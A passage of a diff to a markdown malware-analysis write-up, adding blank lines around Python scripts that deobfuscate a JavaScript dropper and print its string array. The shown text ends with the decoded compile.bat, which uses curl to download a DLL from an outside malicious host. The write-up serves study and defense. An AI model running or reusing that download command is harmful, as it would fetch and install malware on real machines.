@@ -193,6 +193,7 @@ else {
 The interesting part of this script is the rotation of the items in the array.  The items will continue to be rotated until a mathematical condition is met.
 
 The following python script emulates the logic of what is happening in the javascript.
+
 ```python
 import re
 
@@ -224,7 +225,9 @@ while True:
 
 print(value_array)
 ```
+
 **Output**
+
 ```
 ['27EVEPMY', 'win32', '768760SJubeg', 'Linux', '111587KPhwpG', 'compile.bat', '11xGbwXc', 'linux', 'darwin', '36HiOlse', '11PTXHjR', '3696096qOooYF', '173780mPHnxy', '28bejTPQ', '1355673ZDaxId', '779896MgsJdu', 'child_process', '26358GzOkXk', 'MacOS', 'platform', 'cmd.exe', 'win64']
 ```
@@ -251,6 +254,7 @@ cls
 ```
 
 **Python to deobfuscate**
+
 ```python
 import re
 
@@ -278,7 +282,9 @@ for command in commands:
     else:
         print(command)
 ```
+
 **compile.bat (plaintext)**
+
 ```bat
 @echo off
 curl https://pastorcryptograph.at/3/sdd.dll -o compile.dll
